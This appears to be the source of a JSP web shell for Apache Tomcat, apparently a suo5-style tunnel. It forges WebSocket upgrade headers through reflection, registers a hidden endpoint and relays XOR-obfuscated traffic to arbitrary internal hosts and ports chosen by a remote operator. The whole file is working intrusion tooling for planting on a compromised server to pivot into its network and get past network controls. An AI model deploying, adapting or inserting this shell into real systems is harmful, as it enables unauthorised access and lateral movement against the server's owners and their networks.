<%@ page import="java.util.*" %><%@ page import="javax.websocket.server.*" %><%@ page import="org.apache.tomcat.websocket.server.*" %><%@ page import="org.apache.tomcat.util.http.MimeHeaders" %><%@ page import="java.nio.ByteBuffer" %><%@ page import="java.net.InetSocketAddress" %><%@ page import="java.lang.reflect.Field" %><%@ page import="javax.websocket.*" %><%@ page import="java.io.*" %><%@ page import="java.net.Socket" %><%!
    public static class Suo5Endpoint extends Endpoint implements Runnable {
        public static final HashMap ctx = new HashMap();
        private InputStream gInStream;
        private Session gOutStream;
        private String channelId = "";

        public void onOpen(final Session session, EndpointConfig config) {
            session.setMaxBinaryMessageBufferSize(1024 * 1024 * 32);
            session.setMaxTextMessageBufferSize(1024 * 1024 * 32);
            session.setMaxIdleTimeout(0);
            session.addMessageHandler(ByteBuffer.class, new MessageHandler.Whole() {
                public void onMessage(Object message) {
                    try {
                        processMessage(session, (ByteBuffer)message);
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
            });
        }

        public Suo5Endpoint() {
        }

        public void run() {
            try {
                readSocket(gInStream, gOutStream, true);
            } catch (Exception ignored) {
            }
        }

        public Suo5Endpoint(InputStream in, Session out, String channelId) {
            this.gInStream = in;
            this.gOutStream = out;
            this.channelId = channelId;
        }

        private void writeData(Session session, byte[] data) throws IOException {
            synchronized (session) {
                ByteBuffer resp = ByteBuffer.wrap(data);
                session.getBasicRemote().sendBinary(resp);
            }
        }

        private void processMessage(final Session session, ByteBuffer message) throws Exception {
            InputStream dataStream = new ByteArrayInputStream(message.array());
            HashMap dataMap = unmarshal(dataStream);

            String clientId = new String((byte[]) dataMap.get("id"));
            byte[] action = (byte[]) dataMap.get("ac");
            if (action.length != 1) {
//                session.close();
                return;
            }

            /*
                ActionCreate    byte = 0x00
                ActionData      byte = 0x01
                ActionDelete    byte = 0x02
                ActionHeartbeat byte = 0x03
             */
            switch (action[0]) {
                case 0x00: {
//                    System.out.printf("new conn count: %d\n", ctx.size());
                    Socket sc;
                    try {
                        String host = new String((byte[]) dataMap.get("h"));
                        int port = Integer.parseInt(new String((byte[]) dataMap.get("p")));
                        if (port == 0) {
                            // it's not important that the port is open or not
                            port = 22;
                        }
                        sc = new Socket();
                        sc.connect(new InetSocketAddress(host, port), 5000);
//                         to avoid socket block forever
                        sc.setSoTimeout(10 * 60 * 1000);
                        this.put(clientId, new Object[]{sc.getOutputStream(), sc});
                        byte[] resp = marshal(newStatus(clientId, (byte) 0x00));
                        writeData(session, resp);
                    } catch (Throwable e) {
                        this.remove(clientId);
                        byte[] resp = marshal(newStatus(clientId, (byte) 0x01));
                        writeData(session, resp);
//                        System.out.printf("throw conn count: %d %s\n", ctx.size(), e);
                        return;
                    }

                    // start a new thread to read from socket
                    Suo5Endpoint p = new Suo5Endpoint(sc.getInputStream(), session, clientId);
                    Thread t = new Thread(p);
                    t.start();
                    break;
                }
                case 0x01: {
                    Object o = this.get(clientId);
                    if (o == null) {
                        byte[] resp = marshal(newDel(clientId));
                        writeData(session, resp);
                        return;
                    }
                    OutputStream scOutStream = (OutputStream) ((Object[]) o)[0];
                    byte[] data = (byte[]) dataMap.get("dt");
                    if (data.length != 0) {
                        scOutStream.write(data);
                        scOutStream.flush();
                    }
                    break;
                }
                case 0x02: {
                    Object o = this.get(clientId);
                    if (o == null) return;
                    Socket sc = (Socket) ((Object[]) o)[1];
                    sc.close();
                    this.remove(clientId);
//                    System.out.printf("delete conn count: %d\n", ctx.size());
                    break;
                }
                default:
                    break;
            }
        }

        private void readSocket(InputStream inputStream, Session outputStream, boolean needMarshal) throws IOException {
            byte[] readBuf = new byte[1024 * 16];
            while (true) {
                int n = inputStream.read(readBuf);
                if (n <= 0) {
                    break;
                }
                byte[] dataTmp = copyOfRange(readBuf, 0, 0 + n);
                if (needMarshal) {
                    dataTmp = marshal(newData(this.channelId, dataTmp));
                }
                writeData(outputStream, dataTmp);
            }
        }

        private byte[] marshal(HashMap m) throws IOException {
            ByteArrayOutputStream buf = new ByteArrayOutputStream();
            Object[] keys = m.keySet().toArray();
            for (int i = 0; i < keys.length; i++) {
                String key = (String) keys[i];
                byte[] value = (byte[]) m.get(key);
                buf.write((byte) key.length());
                buf.write(key.getBytes());
                buf.write(u32toBytes(value.length));
                buf.write(value);
            }

            byte[] data = buf.toByteArray();
            ByteBuffer dbuf = ByteBuffer.allocate(5 + data.length);
            dbuf.putInt(data.length);
            // xor key
            byte key = (byte) ((Math.random() * 255) + 1);
            dbuf.put(key);
            for (int i = 0; i < data.length; i++) {
                data[i] = (byte) (data[i] ^ key);
            }
            dbuf.put(data);
            return dbuf.array();
        }

        private HashMap unmarshal(InputStream in) throws Exception {
            byte[] header = new byte[4 + 1]; // size and datatype
            readFull(in, header);
            // read full
            ByteBuffer bb = ByteBuffer.wrap(header);
            int len = bb.getInt();
            int x = bb.get();
            if (len > 1024 * 1024 * 32) {
                throw new IOException("invalid len");
            }
            byte[] bs = new byte[len];
            readFull(in, bs);
            for (int i = 0; i < bs.length; i++) {
                bs[i] = (byte) (bs[i] ^ x);
            }
            HashMap m = new HashMap();
            byte[] buf;
            for (int i = 0; i < bs.length - 1; ) {
                short kLen = bs[i];
                i += 1;
                if (i + kLen >= bs.length) {
                    throw new Exception("key len error");
                }
                if (kLen < 0) {
                    throw new Exception("key len error");
                }
                buf = copyOfRange(bs, i, i + kLen);
                String key = new String(buf);
                i += kLen;

                if (i + 4 >= bs.length) {
                    throw new Exception("value len error");
                }
                buf = copyOfRange(bs, i, i + 4);
                int vLen = bytesToU32(buf);
                i += 4;
                if (vLen < 0) {
                    throw new Exception("value error");
                }

                if (i + vLen > bs.length) {
                    throw new Exception("value error");
                }
                byte[] value = copyOfRange(bs, i, i + vLen);
                i += vLen;

                m.put(key, value);
            }
            return m;
        }

        public void readFull(InputStream is, byte[] b) throws IOException, InterruptedException {
            int bufferOffset = 0;
            while (bufferOffset < b.length) {
                int readLength = b.length - bufferOffset;
                int readResult = is.read(b, bufferOffset, readLength);
                if (readResult == -1) break;
                bufferOffset += readResult;
            }
        }

        private HashMap newData(String id, byte[] data) {
            HashMap m = new HashMap();
            m.put("ac", new byte[]{0x01});
            m.put("id", id.getBytes());
            m.put("dt", data);
            return m;
        }

        private HashMap newDel(String id) {
            HashMap m = new HashMap();
            m.put("id", id.getBytes());
            m.put("ac", new byte[]{0x02});
            return m;
        }

        private HashMap newStatus(String id, byte b) {
            HashMap m = new HashMap();
            m.put("id", id.getBytes());
            m.put("s", new byte[]{b});
            return m;
        }

        byte[] u32toBytes(int i) {
            byte[] result = new byte[4];
            result[0] = (byte) (i >> 24);
            result[1] = (byte) (i >> 16);
            result[2] = (byte) (i >> 8);
            result[3] = (byte) (i /*>> 0*/);
            return result;
        }

        int bytesToU32(byte[] bytes) {
            return ((bytes[0] & 0xFF) << 24) |
                    ((bytes[1] & 0xFF) << 16) |
                    ((bytes[2] & 0xFF) << 8) |
                    ((bytes[3] & 0xFF) << 0);
        }

        void put(String k, Object v) {
            synchronized (ctx) {
                ctx.put(k, v);
            }
        }

        Object get(String k) {
            synchronized (ctx) {
                return ctx.get(k);
            }
        }

        Object remove(String k) {
            synchronized (ctx) {
                return ctx.remove(k);
            }
        }

        byte[] copyOfRange(byte[] original, int from, int to) {
            int newLength = to - from;
            if (newLength < 0) {
                throw new IllegalArgumentException(from + " > " + to);
            }
            byte[] copy = new byte[newLength];
            int copyLength = Math.min(original.length - from, newLength);
            // can't use System.arraycopy of Arrays.copyOf, there is no system in some environment
            // System.arraycopy(original, from, copy, 0,  copyLength);
            for (int i = 0; i < copyLength; i++) {
                copy[i] = original[from + i];
            }
            return copy;
        }
    }

    private void SetHeader(HttpServletRequest request, String key, String value) {
        Class requestClass = request.getClass();
        try {
            Field requestField = requestClass.getDeclaredField("request");
            requestField.setAccessible(true);
            Object requestObj = requestField.get(request);
            Field coyoteRequestField = requestObj.getClass().getDeclaredField("coyoteRequest");
            coyoteRequestField.setAccessible(true);
            Object coyoteRequestObj = coyoteRequestField.get(requestObj);
            Field headersField = coyoteRequestObj.getClass().getDeclaredField("headers");
            headersField.setAccessible(true);
            MimeHeaders headersObj = (MimeHeaders) headersField.get(coyoteRequestObj);
            headersObj.removeHeader(key);
            headersObj.addValue(key).setString(value);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
%><%
    ServletContext servletContext = request.getSession().getServletContext();
    ServerEndpointConfig configEndpoint = ServerEndpointConfig.Builder.create(Suo5Endpoint.class, "/x").build();
    WsServerContainer container = (WsServerContainer) servletContext.getAttribute(ServerContainer.class.getName());
    Map pathParams = Collections.emptyMap();
    SetHeader(request, "Sec-WebSocket-Key", "Ymc2MmN6azY0ZW5zd3diZwo=");
    SetHeader(request, "Connection", "Upgrade");
    SetHeader(request, "Sec-WebSocket-Version", "13");
    SetHeader(request, "Upgrade", "websocket");
    UpgradeUtil.doUpgrade(container, request, response, configEndpoint, pathParams);
%>